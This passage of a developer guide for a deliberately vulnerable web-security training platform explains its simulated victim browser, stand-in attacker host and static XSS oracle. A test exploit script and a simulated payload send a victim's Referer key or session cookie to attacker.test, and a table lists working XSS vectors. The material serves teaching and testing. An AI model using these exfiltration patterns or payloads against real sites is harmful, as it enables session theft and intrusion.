7. Import `challenge.js` from the district `index.ts` (and the district from `src/districts/index.ts`).
8. Mutation self-check (section 6). For a stateful lab also: use `labPath` for links and cookie paths,
   bound attacker-keyed maps, and check that waiting and re-signing-in do not beat the limiter.
9. Catalog: the row already exists in `src/catalog.ts` (levels there must equal `impl.levels`; `tests/catalog.spec.ts` checks it).
   Run `npm run gen:catalog` so `docs/CATALOG.md` shows the row as ✅ registered, and commit it with the challenge
   (the stale-catalog test fails otherwise).
10. `npm test`, `npm run typecheck`, `npm run verify:dist` all green; commit `feat(<district>): <ID> <title>`.

Release gate: `npm run gate:catalog` prints `N/122 registered` and exits non-zero below 100. It is deliberately not part of
`npm test` (red until Phases 2-4 land); run it before a release.

## 8. Victim-driven labs (`core/sim.ts`)

Some flaws need someone else to click: the admin opens a reset mail whose link host came from a header (GK-09),
follows an OAuth authorize link while signed in (GK-10, GK-11), signs in through a session link (GK-16). The engine
simulates that victim deterministically and with **no real network**: nothing in `core/sim/` opens a socket,
resolves a name or fetches. A guard in `tests/sim.spec.ts` parses every module in `core/sim/` with the TypeScript
compiler and allows only a fixed list of runtime imports (no dynamic `import()`, `require` or network globals such as
`fetch` or `globalThis`; transitively they reach only `node:buffer` and `node:fs`), spies on fetch, http(s), http2,
tls, net, dgram and dns during a visit, and spies on `net.Socket.prototype.connect` for the whole spec file. The worked
example is the fixture lab SV-01 in `tests/sim-lab.spec.ts`.

Import everything from `core/sim.ts`, a barrel over the pure simulation in `core/sim/` (`limits.ts`: `SIM_LIMITS` and
the copying clip; `url.ts`: the hosts and `classifySimUrl`; `cookies.ts`: the jar; `browser.ts`: `SimBrowser`;
`world.ts`: `simWorld`, `simInbox`, `attackerLog`; no Express at runtime), the engine side in `core/victim.ts`
(`VictimConfig`, the presets, the panel, `mountVictim`, `sendSimRedirect`) and `core/twin.ts` (one page answer for both
browsers: `Reply`, `TwinCookie`, `toSim`, `sendReply`, `cookiePath`, `Visit`, `visitOf`, `simVisitOf`; see "A page that
moves on by itself" below).

### The two hosts

| Host | What it is | What happens to a request |
|---|---|---|
| `http://citadel.test` (default port only) | the lab itself, as the victim sees it: `http://citadel.test/<path>` is the lab route `<labPath>/<path>` | answered in process by the lab's handler |
| `http://attacker.test`, any `*.attacker.test`, any port | the player's server | appended to the player's attacker log; the visit ends there (nothing is served back) |
| anything else | IPs (any spelling), `localhost`, other hosts, citadel.test on another port or a subdomain of it, `javascript:`/`data:`/`file:` ... | unreachable; nothing is logged |

`classifySimUrl(url, base?)` decides, with the WHATWG URL parser browsers use (no DNS). It returns
`{ site, url, origin, host, path, search, query, userinfo, reason? }`; its comment lists the rules. In short: userinfo never
decides the site (`http://citadel.test@attacker.test/` is attacker.test, and the userinfo is never sent), one trailing
dot is dropped (`ATTACKER.TEST.`), `\` is `/` (`http://attacker.test\@citadel.test/` and `/\attacker.test` reach the
attacker), full-width letters map to ASCII while look-alike letters from other scripts become `xn--` labels (never a sim
host), empty labels are `other`, and URLs over `SIM_LIMITS.urlLength` (2048) before or after serialization are `other`.
`attacker.test.citadel.test` is `other`; `citadel.test.attacker.test` is the attacker. **Labs that teach a URL-parsing
flaw do their own (flawed) check in the level file** (`startsWith('http://citadel.test')`, a substring test, a
hand-written parser); the classifier is the ground truth for where the victim's browser then went.

### What is simulated

- **`simWorld({ mailboxes })`**: one player's world at one level: `world.inbox`, `world.attackerLog`, the victim's recent
  visits (`world.visits`) and a clock (`world.now`, a test seam like `state.now`).
- **`world.inbox`**: fixed mailboxes, `PLAYER_MAILBOX` (`pilgrim@citadel.test`) always plus the ones named (usually
  `ADMIN_MAILBOX`); mail to any other address bounces (`deliver()` returns `undefined`), so no map is keyed by attacker
  input. `deliver({ from, to, subject, body, links })`, `newest(address)`, `list(address)` (newest first). Links are an
  explicit list: "the admin clicks the first link" is `links[0]`.
- **`world.attackerLog`**: append-only, capped (oldest dropped, sequence numbers keep counting): method, URL, `Referer`,
  form body, time.
- **`world.browser(handler)`**: a victim's browser. `follow(url, { referrer? })` opens a link, `submit(url, form)` posts a
  form; both return a `SimVisit` trace (`outcome`: `page` | `attacker` | `unreachable` | `too-many-redirects` | `loop`,
  the `hops`, and the final citadel `page`). Its cookie jar (`browser.cookies`) holds citadel.test cookies only, never
  real ones and never sent to attacker.test; `cookies.set()` signs the victim in up front. Every citadel request calls
  `handler(req: SimRequest): SimResponse` synchronously: `req` has `method`, `url`, `path`, `query`
  (URLSearchParams), lower-case `headers`, `cookies` and form `body` (null prototypes; `field()` and `header()` work on
  it); the response is `{ status, headers?, body? }`, where `Location` (followed on 301, 302, 303, 307 and 308 only:
  any other status, a 300 or 304 with a Location included, is a page), `Set-Cookie`, `Refresh` and `Referrer-Policy`
  are honoured. At most 10 redirects; the same request again with the jar unchanged is a loop.
- **Referer, as real browsers send it**: a link opened from mail has none; `follow(url, { referrer })` is a click on a
  citadel page. **A redirect keeps the referrer of the page that started the navigation** (an open redirect does not leak
  its own URL). **A citadel page that moves the browser on by itself sends its own URL**: answer
  `200` with `Refresh: 0; url=<next>` (the stand-in for a meta refresh or a script; the sim does not parse HTML).
  `Referrer-Policy` on that page (or on a redirect) applies; the default is the legacy full URL
  (`no-referrer-when-downgrade`). The Referer never carries userinfo or a fragment, and nothing ever comes FROM attacker.test.
  So an OAuth code leaks through `Referer` only from a page that forwards (GK-10 Inquisitor: the callback page moves on
  to `next=`), and Divine can stop it (`Referrer-Policy: no-referrer`, no secrets in URLs, no open forward).
- **Limits** (`SIM_LIMITS`): URL 2048 chars, 10 redirects, 3 mailboxes (the player's included) of 10 mails (subject 200,
  body 2000, 3 links), 30 log entries, 20 cookies of 4096 bytes, 5 visits (page bodies kept to 2000 chars), notes of
  500 chars. **Every stored field is a copy** (or a constant): a clipped field, a mail's `to` (the mailbox's own
  address, never the padded input), every URL the browser keeps, cookie names, values and paths, Referers. A trimmed,
  lower-cased, split or matched string, a URL getter or a query value can be a view that keeps its whole parent (a
  100 KB form field, a long fragment) alive, so the sim never stores one.

### All victim state goes through `perSession`

`simWorld()`, `simInbox()`, `attackerLog()` and `world.browser()` throw unless called inside a `perSession` factory, so
victim state is always per player and level, bounded, and inherits the new-instance limits. They also cap the holder
whose factory creates them (`capPerSessionHolder` in `core/lab.ts`), because a filled world is up to about a megabyte
and the container has 512 MB:

- **One budget for the whole process.** Every holder that keeps sim state (directly, or through a nested holder whose
  instance it keeps), in every lab and at every level, shares `SIM_LIMITS.worldsTotal` (150) instances in all (about
  100-170 MB at worst). Creating one at the budget evicts the
  least recently used of them, whichever lab it belongs to; the new one is never refused. Adding a victim-driven lab
  does not raise the bound. A lab's own `maxEntries` still applies within it.
- **Eviction is a reset** of that player's instance at that level (section 4), and a shared budget turns over in
  minutes: keep no limiter, lockout or attempt budget in victim-driven state.
- At most `SIM_LIMITS.newWorldsPerMinute` (30) new instances a minute per holder, by default and as a ceiling: a lab may
  pass a lower `maxNewPerMinute`, never higher (asking for more fails at the first factory run).
- Tests may shrink the budget with `setCappedBudget(n)` from `core/lab.ts` (restore the value it returns).

Keep the world and the victim's browser in the lab's own per-session state, next to whatever else the lab tracks
(accounts, tokens, codes), so one eviction or one `reset` drops all of it together:

```ts
// model.ts
export interface LabState { readonly world: SimWorld; readonly admin: SimBrowser; readonly adminPid: string; /* accounts, tokens ... */ }
const labs = perSession((level): LabState => {
  const world = simWorld({ mailboxes: [ADMIN_MAILBOX] });
  const adminPid = newId(); // src/districts/_shared/collections.ts
  // Typed, not `as LabState`: an assertion silently accepts a missing required field. The handler reads `state` only
  // when the victim browses, after the const is assigned.
  const state: LabState = { world, admin: world.browser((r) => citadel(level, state, r)), adminPid /* , ... */ };
  state.admin.cookies.set('pid_session', adminPid); // already signed in to Pilgrim-ID
  return state;
});
export const labFor = (req: { sessionId: string; level: Level }) => labs.for(req);
```

The handler needs the level modules, and it lives where the factory does. So a victim-driven lab may gather them in
`model.ts` (`export const impl = byLevel<M>({ acolyte, templar, inquisitor, divine })`), and `challenge.ts` passes
`impl.levels` to `defineChallenge`. Its level files then import ONLY types from `model.ts`: a runtime import would close
an ESM cycle (model imports the levels). Shared values come from `_shared/` (e.g. `gatekeeper/_shared/oauth.ts`) or
are local constants in the level file. The page functions both browsers call and the citadel handler may live in
`model.ts` too (section 1). Worked examples: GK-10, GK-11, GK-16.

### How levels plug in

The handler is the lab seen from the victim's browser. It dispatches on `r.path` and calls **the same level functions
the real routes call**, so the flaw lives in `levels/*.ts` once and View Source and the Diff tell the whole story.
Paths are twins: `http://citadel.test/<path>` is the real route `<labPath>/<path>`, so the handler and the router
use the same path for the same page (`/idp/authorize` in both examples below):

```ts
// model.ts (with `impl`, so the factory above can build the handler)
function citadel(level: Level, state: LabState, r: SimRequest): SimResponse {
  const impl = byLevelImpl.for(level);
  if (r.path === '/idp/authorize') return impl.authorize(state, r.query, r.cookies.pid_session, ''); // { status: 302, headers: { Location } }
  if (r.path === '/reset') return { status: 200, body: 'Choose a new password' };
  return { status: 404, body: 'Not found' };
}
```

Real routes serve the player's real browser (Express, `sendPage`); the handler serves the victim (plain objects,
never HTTP). Links the lab builds for mails are sim URLs (`http://citadel.test/reset?token=...`, or whatever host a
flawed level put there); the panel turns citadel links in the player's own mailbox into "open in lab" links
(`labHref`), and shows every other link as text.

**Where the lab lives is a parameter.** One level function answers both browsers, the player's at
`/d/<district>/<slug>/...` and the victim's at `http://citadel.test/...`, so it never hard-codes either: it takes a
`base` and builds every lab-local `Location` (`${base}/idp/login`) and cookie `Path` (`base || '/'`) from it. Real
routes pass `labPath(res)`; the citadel handler passes `''` (use `CITADEL_ORIGIN` where a sim URL must be absolute, e.g.
a link in a mail or a registered `redirect_uri`). A hard-coded `Path=/d/...` never matches in the victim's jar (its
requests are for `/callback`), and a hard-coded `/callback` leaves the lab on a real route.

**A real route never answers a sim URL with `res.redirect`.** URLs that are data (the registered
`http://citadel.test/callback`, a player's `redirect_uri` or `next=`) are sim URLs: the player's own browser cannot reach
citadel.test, and `res.redirect(redirect_uri)` from a lab route would be a REAL open redirect off the loopback lab.
Answer a level's 3xx with `sendSimRedirect(res, location, status?)`: a citadel URL (or a path under `labPath(res)`)
goes to the same place in the lab at the served level (the IdP's `302 http://citadel.test/callback?code=...` becomes
`302 <lab>/callback?code=...&level=<level>`); anything else (attacker.test, another host, `javascript:`) gets a page
that shows the URL as text and says that in this lab the simulated victim's browser goes there. It never links to it.
An empty or blank Location (an empty `redirect_uri`) gets a "this redirect has no target" page, never a redirect to
the route itself.

**A page that moves on by itself is as much a redirect.** A level page that forwards (the sim's `200` + `Refresh`, e.g.
GK-10 Inquisitor's callback forwarding to `next=`) must never send the player's real browser a real `Refresh` to a
level-made URL either, and a silent 302 would hide the very forward the lab teaches. Render the page instead, with a
note saying where it moves the browser on to: a link to the same place in the lab for a citadel target, the URL as
escaped text otherwise.

**The twin: one `Reply`, two browsers (`core/twin.ts`, imported from `core/sim.ts`).** A page function answers a
`Reply` (`status`, `location?`, `forward?`, `referrerPolicy?`, `cookies?`, `text`), and the engine turns it into each
browser's answer:

- `toSim(reply)` for the citadel handler: a `SimResponse` with `Location`, `Refresh: 0; url=<forward>`,
  `Referrer-Policy` and one `Set-Cookie` per cookie.
- `sendReply(res, reply, render)` for the real route: it sets the cookies, sends a `location` through `sendSimRedirect`
  only on a redirect status (`REDIRECT_STATUSES`; a Location on any other status is a page, as in the sim), and
  otherwise calls `render(forward?)` at the Reply's status, handing a forward's `ForwardNote` to the view. A view at
  `src/districts/<district>/<lab>/views/` includes the engine's note with
  `<%- include('../../../../core/views/forward-note', { forward: forward }) %>`. The page's own message, and a flag it
  carries, stay visible.
- **Cookies** (`TwinCookie`): `{ name, value, path, clear?, maxAgeSec?, httpOnly?, sameSite?, secure? }`. The path is
  `cookiePath(base)` (`base || '/'`). The defaults are HttpOnly and `SameSite=Lax` (as `hvwa_sid`), not Secure; both
  browsers get the same attributes. `httpOnly: false` is for a cookie the lab means to be read or edited client-side.
  `sameSite: 'Strict' | 'Lax' | 'None'`: a lab whose lesson is SameSite (CSRF) sets it per level IN THE LEVEL FILE, so
  View Source and the Diff show it (Acolyte's `sameSite: 'None'` with `secure: true` is the realistic
  misconfiguration). Any other value throws, and so does `'None'` without `secure: true`, set or cleared: browsers
  drop a `SameSite=None` cookie that is not Secure, so the lab would test nothing. `secure: true` adds Secure. The
  open edge: today the simulated browser on `http://citadel.test` refuses a Secure cookie (as a browser does on plain
  http) and its jar ignores SameSite; engine task E1 will make the sim jar accept Secure cookies from
  `http://citadel.test` and apply SameSite. The player's own browser treats `http://127.0.0.1` as a secure context and
  keeps a Secure cookie from it in Chromium and Firefox, but maybe not in Safari. `maxAgeSec` is in seconds (Express's
  `maxAge` is milliseconds: `sendReply` converts).
- **Requests** (`Visit`: `level`, `query` (the raw query string as `URLSearchParams`, never Express's parsed
  `req.query`; everything after the first `?`), `cookies` (only the lab's own, as strings), `base`):
  `visitOf(req, res, cookieNames)` on a real route (`base` is `labPath(res)`), `simVisitOf(level, r, cookieNames)` in
  the citadel handler (`base` is `''`). Give both the same names, one `labCookies(level)` list in `model.ts`, so a
  page function sees the same cookies in both browsers. (`simVisitOf` without names keeps every cookie the simulated
  browser sent: the behaviour before the filter, kept so older callers still compile; GK-10, 11 and 16 pass names.)
  The page function takes the `Visit` and never sees Express or the sim.

```ts
// model.ts: one page function, both browsers
export const labCookies = (level: Level): readonly string[] => [pidCookie(level)];
export function authorize(v: Visit, state: LabState): Reply {
  const user = state.sessions.get(v.cookies[pidCookie(v.level)] ?? '');
  if (user === undefined) return { status: 200, text: 'Sign in first.' };
  const to = v.query.get('redirect_uri') ?? '';
  if (!impl.for(v.level).allowRedirect(to)) return { status: 400, text: 'Unregistered redirect_uri.' }; // the flaw: levels/*.ts
  return { status: 302, location: withParams(to, { code: issueCode(state, user) }), text: '' }; // districts/_shared/url.ts
}
function citadel(level: Level, state: LabState, r: SimRequest): SimResponse {
  if (r.path === '/idp/authorize') return toSim(authorize(simVisitOf(level, r, labCookies(level)), state));
  return { status: 404, body: 'Not found' };
}

// challenge.ts: the twin of http://citadel.test/idp/authorize, in the player's own browser
const visit = (req: Request, res: Response): Visit => visitOf(req, res, labCookies(req.level));
router.get('/idp/authorize', (req, res) => {
  const r = authorize(visit(req, res), labFor(req));
  return sendReply(res, r, () => sendPage(res, view('idp'), { base: labPath(res), text: r.text })); // never res.redirect
});
```

A lab that does not use `Reply` still answers a level's Location with `sendSimRedirect(res, location, status?)`, never
`res.redirect(location)`.

### Scripting the victim

The two usual actions are presets; use them unless the victim's script is different:

```ts
/** The admin starts every action signed in to Pilgrim-ID, whatever the player's last link did. */
const rearm = (req: Request, admin: SimBrowser) => { admin.cookies.set('pid_session', adminSession(labFor(req))); };

register(defineChallenge({
  /* id, district, slug, dir, title, summary, maps, levels, hints, mount */
  victim: {
    sim: (req) => labFor(req).world,
    actions: [
      // opens the newest mail in its mailbox and clicks links[link] (default 0), from a mail client (no Referer)
      checkMailAction({ browser: (req) => labFor(req).admin, mailbox: ADMIN_MAILBOX, rearm }),
      // opens whatever link the player types in (input: 'url')
      sendLinkAction((req) => labFor(req).admin, { rearm, description: { id: '...', en: 'opens any link you send, while signed in to Pilgrim-ID' } }),
    ],
  },
}));
```

Both take `name`, `label`, `description` (platform defaults fit) and a REQUIRED `rearm`; `checkMailAction` answers with a
bilingual note when the mailbox is empty or the newest mail has no such link. A custom action is
`{ name, label, description?, input?: 'url', run: (req, { url }) => note | void }`:

```ts
{ name: 'open-inbox', label: { id: 'Minta admin membuka kotak masuk', en: 'Ask the admin to open the inbox' },
  description: { id: 'membuka /inbox dan mengklik tautan pertama di sana', en: 'opens /inbox and clicks the first link on it' },
  run: (req) => {
    const s = labFor(req);
    rearm(req, s.admin);
    const link = firstLinkOn(s.admin.follow('http://citadel.test/inbox').page?.body ?? '');
    if (link === undefined) return { id: 'Kotak masuk admin kosong.', en: "The admin's inbox is empty." };
    s.admin.follow(link, { referrer: 'http://citadel.test/inbox' }); // a click on a citadel page: pass its URL
  } },
```

The engine mounts `POST <lab>/victim/<name>?level=<level>` per action **before** the lab's own routes (the
`/victim/` prefix is reserved): it reads the `url` field (`input: 'url'`), runs `run` synchronously (a Promise is a
500), and answers 303 back to `<lab>?level=<level>`, so the forms work without JavaScript. Under every lab page
rendered with `sendPage` the layout adds the panel: the two hosts, one form per action (the link field keeps the last
link sent), "What the victim's browser did" (the note, and per visit its outcome and request count, **never its
URLs**: they can carry the very secret the lab is about; only the visits made during the last action, numbered within
it, the last 5 shown; a `run` that throws is shown as failed and its error goes to the error handler), **the player's
mailbox only**, and "Your server (attacker.test) received…". Platform strings are bilingual; everything else is escaped. The only way a victim-side
secret may reach the player is the lab's flaw (the attacker log, or a stolen session): never echo the victim's pages
or the admin's mail anywhere else. Labels: `VICTIM_LABELS.checkMail` / `.sendLink`, or a lab `Text`.

- **`description`** (optional `Text`) is shown under the button: the victim's script in a few words ("opens the newest
  mail and clicks its first link", "opens any link you send, while signed in to Pilgrim-ID").
- **The note carries what the summary cannot show.** The panel summarises each visit by outcome and request count only,
  so it cannot say *why* nothing happened: "the admin was not signed in", "the admin has no new mail", "the reset link
  had expired". `run` returns that note as `Text` (player guidance, shown in the player's language) or, rarely, a plain
  string (lab content, shown as-is); either is clipped to 500 chars. Anything else is a programming error (500).
- **A click on a citadel page passes `referrer` explicitly**: `follow(link, { referrer: 'http://citadel.test/inbox' })`.
  Without it the request carries no Referer, as for a link opened from a mail client, and a Referer-based lab would
  silently test nothing.
- **Re-arm the victim at the start of every action.** The player's link can undo the victim's standing state: a link
  to `/logout`, or a page whose `Set-Cookie`s overflow the 20-cookie jar and evict the admin's session. A lab without
  Restart would then stay stuck until the 26 h TTL. The presets require `rearm` (call it first in a custom `run`): it
  restores that state by setting cookies (`browser.cookies.set`), as the factory did, and never browses (a visit would
  show in the report). Re-arm only the standing state, never what the exploit itself changes. A victim with no
  standing state (nobody signed in, nothing to restore) passes an explicit no-op, `rearm: () => {}`, so the choice is
  made on purpose and a forgotten re-arm is an error, not a lab that silently gets stuck. `browser.cookies.clear()` is
  a valid re-arm for a victim whose standing state is "a fresh browser" (GK-16: the admin opens your link in a fresh
  browser, then signs in), but only when the action's `description` says so ("in a fresh browser"), and only when no
  exploit relies on the victim's cookies surviving from one action to the next.

Restart: a victim-driven lab whose state can get stuck may pass `reset: (req) => labs.reset(req)`; that drops the
world (inbox, attacker log, victim cookies) with the rest. The usual rule applies: no Restart on a lab with limiters.

### Testing

An exploit is a script, as the player would do it: craft the link → trigger the victim (`POST <lab>/victim/<name>`) →
read the attacker log on the lab page (`GET <lab>?level=<level>`) → complete the attack on the real lab → flag. Divine
resists with its usual answer. See SV-01 in `tests/sim-lab.spec.ts`:

```ts
const exploit: Script = async (agent, level) => {
  await agent.post(`${LAB}/victim/send-link?level=${level}`).type('form').send({ url: 'http://citadel.test/continue?next=http://attacker.test/x' });
  const page = await agent.get(`${LAB}?level=${level}`);
  const ref = attackerHits(page.text).find((h) => h.url === 'http://attacker.test/x')?.referer;
  const key = ref === undefined ? 'none' : new URL(ref).searchParams.get('key') ?? 'none';
  return agent.post(`${LAB}?level=${level}`).type('form').send({ key });
};
```

Read the page as the player would, with the helpers in `tests/helpers.ts`: `attackerHits(html)` parses the panel's
attacker log (one `{ seq, at, method, url, referer?, body? }` per `<li data-seq>`, unescaped, oldest first, like
`world.attackerLog.entries()`), `referers(html)` lists the Referers, `panelOf(html)` cuts out the panel and
`unescapeHtml(s)` undoes the escaped output tag. They read only the panel's log, never the lab's own content or the
mailbox, in either language. Test seams: `labFor({ sessionId: sid, level }).world` (`.visits` for the full trace,
`.attackerLog.entries()`, `.inbox.list(ADMIN_MAILBOX)`, `.now = () => t` for timestamps and expiry). `describeLabView`
works unchanged (it skips the panel's `sim-action` forms). Add the lab-specific cases: the victim's secret never
appears on the page except through the flaw, players and levels are isolated, the legit victim flow ends on a citadel
page, and links the lab builds from attacker input are shown escaped.

**The victim-lab test kit** (`src/districts/_shared/victim-lab.testkit.ts`, any district; GK-08, 09, 10, 11 and 16 use
it) holds what these specs repeat, modelled on `pilgrim-lab.testkit.ts`:

- `victimClient(path)`: `sendLink(agent, level, url, action?)` and `checkMail(agent, level, action?)` (the victim's
  buttons); `browse(agent, url, maxHops = 6)` follows your real browser's redirects and returns `{ res, at }`.
- `describeSignInView({ challenge, path, account? })`: `describeLabView` for a front page that signs in with a
  username and password (default pilgrim/pilgrim).
- `describeVictimAction({ challenge, path, description: { en, id }, label? })`: the panel says what the victim does, in
  both languages, at every implemented level (write `'` as `&#39;`: the panel escapes it).
- `describeLabCookies({ challenge, path, cookies: [{ name: (level) => string, set: (agent, level, base) => request,
  httpOnly? }] })`: each lab cookie has one name per level and gets the canonical path even from an upper-case URL
  (`set` receives the upper-cased path as `base`), and is HttpOnly unless `httpOnly: false`.
- `describeOddBodies({ challenge, path, forms, statuses?, bodies? })`: odd JSON bodies on the forms besides the front
  page (e.g. `['/forgot', '/reset']`) are a failed request at every level (default status 200; add 303 for a form that
  redirects), never a 500 or a flag.
- "Never leaves the lab" assertions: `expectInLab(res, path, level)` (a redirect status whose Location is under the lab
  path with `level=<level>`; returns the Location), `expectAwayPage(res)` (sendSimRedirect's page for an off-lab target:
  200, no Location, no Refresh, the URL as text, no link; returns the section), `expectNoWayOut(res)` (200, no Location,
  no Refresh) and `forwardNoteOf(html)` / `awayOf(html)` to read the forward note and the away page.

Engine-level twin tests live in `tests/twin.spec.ts` (a fixture lab for both browsers, `sendReply` on a fake Response,
the cookie attributes, `visitOf`).

## 9. XSS labs (`core/xss`)

An XSS lab is a victim-driven lab (section 8) whose proof is "the admin's browser ran your script". The simulated
browser runs no JavaScript, and **no player JavaScript ever runs in the server process**. A static oracle decides
instead: parse5, the HTML5 tree builder browsers use, parses the exact bytes the admin's browser received, and a rules
table (`core/xss/rules.ts`) says whether attacker bytes made a sink that would run the player's **marker call**
`hvwa('<nonce>')`. The nonce is per player and level. Where a real payload would send `document.cookie` home, the
player calls the marker. The worked example is the fixture lab XV-01 in `tests/xss-lab.spec.ts`, a reflected search at
four levels. Import XSS things from `core/xss.ts` and sim things from `core/sim.ts`.

### The recipe

1. **Declare the sink in the level file.** The level builds the one fragment the lesson is about, escaping it or not
   (section 5): `results(q): string`, `renderReview(body)`, `renderMarkdown(src)`. **One function serves both
   browsers.** The citadel handler puts it in the admin's page, and the real route puts it in the player's preview, so
   the oracle judges exactly what the player watches.
2. **Keep the marker and the admin in the lab's `perSession` state.** Make both in the factory, next to the world:

   ```ts
   const labs = perSession((level): LabState => {
     const world = simWorld();
     const marker = newMarker(); // 16 CSPRNG hex digits; throws outside a perSession factory
     const key = newId();         // the admin's session: what the payload steals
     const state: LabState = {
       world, marker, key,
       // The canary is read when the payload runs: a signed-out admin has nothing to steal.
       admin: xssBrowser(world, (r) => citadel(level, state, r), { marker: marker.call, canary: () => state.admin.cookies.get(SESSION) ?? '' }),
     };
     state.admin.cookies.set(SESSION, key); // already signed in
     return state;
   });
   ```

   `xssBrowser` is `world.browser(handler)` with one addition. Every page it renders goes through
   `xssOracle(body, marker)` first, before the browser sees the answer, which is unchanged. A rendered page is any
   answer except a followed redirect, of a type a browser renders as a document, and not a download. When the payload
   runs, exactly one request lands in the player's attacker log: `GET http://attacker.test/steal?c=<canary>`, with no
   Referer.
3. **Render the preview.** The view shows the marker (escaped), the player's input (escaped, in the lab chrome) and
   one raw value, the preview: `preview = previewFrame(level.results(q), { marker: state.marker.call, title })`, output
   with `<%- preview %>`. Never output the raw fragment anywhere else on the page.
4. **Wire the victim.** Use the usual presets with the XSS browser. `sendLinkAction` covers reflected and DOM XSS ("the
   admin opens the link you send"). For stored XSS, `checkMailAction` or a custom action (`run` follows `/scroll`, the
   page that renders the stored payload). Pass a REQUIRED `rearm` that signs the admin back in (section 8). Stored
   payloads live in `perSession` state, bounded (cap reviews and keep the newest). A stored payload can wedge the view,
   so these labs may define `reset` (they have no limiter).
5. **Prove the flag.** The player reads the canary from their attacker log and completes the attack on the real lab:
   signs in with the stolen session, or submits it. That route calls `flagFor`. At Divine the fragment is escaped, so
   nothing fires and no canary arrives. The flag never comes from the preview: what the player sees there is
   decorative.

### What the oracle counts

`xssOracle(html, marker, { insertion?, interact?, sandbox? })` answers
`{ executes, sinks, reachedMarker, mxss, limited? }`. `executes` is true when a sink whose code contains the marker
call would run in the page's origin.

| Sink row | Runs (examples) | Does not run (examples) |
|---|---|---|
| element (`script`) | `<script>`, `type=module`, a JS MIME type, `src="data:,..."` | `type=text/plain`, `nomodule`, `src=http://...` (its code is not on the page), entities inside an HTML script |
| attribute (`event-handler`) | `img src=x onerror`, `svg onload`, `body onload`, `autofocus onfocus`, `details open ontoggle` (fire by themselves: trigger `load`); `onmouseover`, `onclick` (trigger `interaction`) | unknown names (`onfoo`), `data-onload`, `onerror` on an element that never fetches, `onfocus` on one that cannot take focus, window events on anything but `body` |
| URL scheme (`url-scheme`) | `javascript:` on `a`/`area`/`form`/`button[formaction]` (interaction), `iframe src` (load); tabs, case, entities and `%`-encoding are undone first | `img src=javascript:`, `object data=javascript:`, `meta refresh`, top-level `data:` links; a `data:` frame runs, but `isolated` |
| `srcdoc` | the framed document's own sinks, in the page's origin | a `sandbox` without `allow-scripts`; with `allow-scripts` alone the sinks are `isolated` |
| SVG (`svg-script`) | `<svg><script>` (entities decoded), SMIL `onbegin`/`onend`, `foreignObject` and MathML `mtext` switching back to HTML | `onload` on SVG children (`g`, `rect`) |
| style | none: CSS is never script; `<svg><style><img onerror>` runs only because the img breaks out of foreign content | `<style>`, `style=url(javascript:...)`, `@import 'javascript:'` |

- **The marker** must appear literally in the sink's code, in any quote style, with spaces, or as a method call
  (`window.hvwa("n")`). The oracle does not parse JavaScript: obfuscation it cannot see is not proof. Another player's
  marker, or another level's, never counts.
- **`reachedMarker`** with `executes: false` means the payload reached the page as text: escaped, in a comment, or
  in an attribute. A lab may say so in a note.
- **`interact`** defaults to true: the admin reads the page and hovers and clicks it. Pass `false` for a victim who
  only loads the page.
- The rules were checked against headless Chrome 157 on 194 cases, both insertion modes. The cases that differ are
  ones a harness cannot drive (opening a `<details>` with no `<summary>`; CSS animation events).

### Variants the labs need

- **DOM XSS and prototype pollution (SC-03, FP-11).** The server's page is benign; the lab's own client script writes
  the sink. Give `xssBrowser` a `dom` twin, a function in the level file that mirrors the shipped script. It receives
  each rendered page as `{ url, path, query, hash, status, body }`, where `hash` is `location.hash` exactly as the
  browser has it. The fragment is never sent to the server, and a redirect without its own fragment keeps the link's.
  The twin returns `{ html, insertion? }` for what the script writes. `insertion: 'innerHTML'` (the default) covers
  innerHTML, outerHTML and insertAdjacentHTML: inserted scripts never run or fetch, but handlers do.
  `'document'` covers document.write and createContextualFragment. Keep the twin and the shipped script in lock-step:
  one constant, or a spec over a payload corpus. The preview runs the real script: pass
  `previewFrame(pageHtml + script, { hash })`. A prototype-pollution twin merges into a simulated object and never
  touches the host's `Object.prototype`. (A shared `safeishMerge` helper is engine task E3.)
- **mXSS (SC-06).** `mxss` is true when a parse, serialize, parse round trip adds a marker sink the first parse did
  not have. The round trip is checked with scripting on, and from a scripting-off parse when the page mentions
  `noscript`. Judge the sanitizer's input with it, because that is what the sanitizer saw. The browser then simply
  parses its output, and the victim's page `executes`. For Divine's "re-parse and compare", use
  `roundTrip(html, { insertion: 'innerHTML' })` to reach a fixed point. The known corpora (MathML
  `mglyph`/`style`, the DOMPurify form case, nested `mtext`, noscript) are pinned in `tests/xss.spec.ts` with their
  exact round trips, so a parse5 bump that changes serialization fails there. parse5 uses HTML's classic serializer,
  which does not escape `<` and `>` in attribute values. That is what a server-side parse and serialize sanitizer
  produces.
- **Served markup (SC-05, SC-09).** What the admin's browser renders depends on the response headers. No type,
  `text/html`, `application/xhtml+xml`, `image/svg+xml` or XML are rendered; anything else (`application/octet-stream`,
  `image/png`) and any `Content-Disposition: attachment` are not. XML types are parsed with the HTML parser, as an
  inline `<svg>` would be. A `Content-Security-Policy: sandbox` applies; other CSP directives are not evaluated. A
  Divine level escapes; its CSP is defence in depth, never the fix. Per the SC-05 amendment, the real route always
  sends an inert download, and the payload fires only in the preview.
- **HTML mail (FP-12).** Mail clients run no script. `linkSinks(html)` lists every link and resource URL in document
  order (`a`, `area`, `form`, `img`/`srcset`, CSS `url()`/`@import` ...), parsed with scripting off as a mail client
  parses. Build the mail's `links` from it, and classify each URL with `classifySimUrl`. It reports `link` with
  trigger `interaction` (the admin clicks) and `resource` with trigger `load` (the client fetches it).

### Bounds (`XSS_LIMITS`)

parse5 is synchronous, and its worst inputs are superlinear: one tag with thousands of distinct attributes, and deep
or misnested trees. So every oracle call is bounded **before** parsing:

- at most 16 KiB of page (`htmlLength`);
- at most 1024 tag openers (`tags`, which bounds depth and parse5's per-token scope checks);
- a round trip only for trees at most 512 deep (parse5 serializes recursively);
- srcdoc documents 2 deep;
- one parse budget for the page, its frames and its re-parses;
- a 250 ms backstop.

A page over the size or tag cap is refused unparsed (`executes: false, limited: 'size' | 'tags'`), so keep citadel
pages under 16 KiB: cap stored items, and cap uploaded SVG at 16 KiB, not 64. Measured at the caps (Node 22.22,
parse5 8.0.1): the worst input is one tag with 16 KiB of distinct attributes, about 60 ms per oracle call warm and about
90 ms cold. A realistic 5 KB lab page takes about 2 ms. Under heavy CPU contention the worst case reached about
360 ms. A victim action blocks for that long at most: a self-DoS in a single-player loopback lab, like the SQL residual
in section 4. Verdicts list at most 64 sinks, and every string kept is a copy.

### Player safety

- The preview is `<iframe sandbox="allow-scripts" srcdoc="...">`, never `allow-same-origin`, so it gets an opaque
  origin: `document.cookie` and `parent.document` throw. Its document starts with a meta CSP that lets no request out
